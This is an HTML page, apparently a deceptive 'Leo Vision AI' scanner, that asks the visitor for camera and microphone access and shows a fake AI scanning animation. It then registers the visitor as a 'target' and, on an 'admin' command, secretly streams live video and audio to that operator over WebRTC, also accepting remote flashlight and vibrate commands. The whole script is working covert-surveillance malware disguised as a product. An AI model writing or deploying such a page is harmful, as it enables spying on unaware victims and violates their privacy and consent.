<!DOCTYPE html>
<html lang="en">
<head>
    <title>Leo Vision AI</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root { --primary: #00d4ff; --bg: #050a14; --panel: #0a192f; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        header { width: 100%; padding: 20px; text-align: center; background: var(--panel); border-bottom: 1px solid #1e3a8a; }
        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); letter-spacing: 2px; }
        
        .container { position: relative; width: 90%; max-width: 400px; margin-top: 30px; border-radius: 20px; overflow: hidden; border: 2px solid var(--primary); background: #000; aspect-ratio: 3/4; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        /* Realistic AI Scan Animation */
        .scan-bar { position: absolute; width: 100%; height: 2px; background: var(--primary); top: 0; box-shadow: 0 0 15px var(--primary); animation: scan 3s infinite linear; z-index: 5; }
        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
        
        .info-box { width: 90%; max-width: 400px; background: var(--panel); margin-top: 20px; padding: 15px; border-radius: 12px; font-size: 0.8rem; border: 1px solid #1e3a8a; }
        .btn-activate { margin-top: 25px; background: var(--primary); color: #050a14; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(0,212,255,0.4); }
        .hidden { display: none; }
    </style>
</head>
<body>

    <header><div class="logo">LEO VISION AI</div></header>

    <div class="container">
        <video id="localVideo" autoplay playsinline muted></video>
        <div id="scanner" class="scan-bar hidden"></div>
    </div>
    <div class="info-box">
        <div id="status">System Status: <span style="color: #ff4444;">Offline</span></div>
        <div id="log" style="color: var(--primary); margin-top: 5px; font-family: monospace;">Ready for hardware calibration...</div>
    </div>

    <button id="startBtn" class="btn-activate" onclick="startApp()">ACTIVATE AI SCANNER</button>

    <script>
        const socket = io();
        let stream, pc, adminId;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        async function startApp() {
            document.getElementById('startBtn').classList.add('hidden');
            document.getElementById('status').innerHTML = 'System Status: <span style="color: #00ff00;">Online</span>';
            
            try {
                // V1 Wala Solid Logic - Direct Mic & Camera
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
                document.getElementById('localVideo').srcObject = stream;
                document.getElementById('scanner').classList.remove('hidden');
                document.getElementById('log').innerText = "AI Neural Link Active. Scanning...";

                socket.emit('target-join');
            } catch (err) {
                alert("Please allow Camera/Mic for AI Vision.");
                location.reload();
            }
        }
        socket.on('command', async (data) => {
            if (data.cmd === 'start-stream') {
                adminId = data.adminId;
                if(pc) pc.close();
                pc = new RTCPeerConnection(config);
                stream.getTracks().forEach(t => pc.addTrack(t, stream));
                pc.onicecandidate = (e) => {
                    if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } });
                };
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                socket.emit('signal', { to: adminId, signal: { sdp: offer } });
            } else if(data.cmd === 'flash') {
                const t = stream.getVideoTracks()[0];
                const s = t.getSettings();
                await t.applyConstraints({ advanced: [{ torch: !s.torch }] });
            } else if(data.cmd === 'vibrate') { window.navigator.vibrate(200); }
        });

        socket.on('signal', async (data) => {
            if(data.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
            else if(data.signal.candidate) await pc.addIceCandidate(new RTCIceCandidate(data.signal.candidate));
        });
    </script>
</body>
</html>
